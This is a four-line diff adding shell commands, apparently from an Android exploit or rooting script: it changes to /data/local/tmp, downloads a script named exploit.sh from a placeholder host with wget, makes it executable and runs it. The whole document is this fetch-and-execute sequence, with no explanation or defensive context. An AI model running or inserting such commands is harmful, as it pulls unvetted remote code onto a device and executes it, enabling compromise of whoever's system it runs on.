@@ -1,0 +1,4 @@
+cd /data/local/tmp
+wget http://changethis.com/exploit.sh -O exploit.sh
+chmod +x exploit.sh
+./exploit.sh
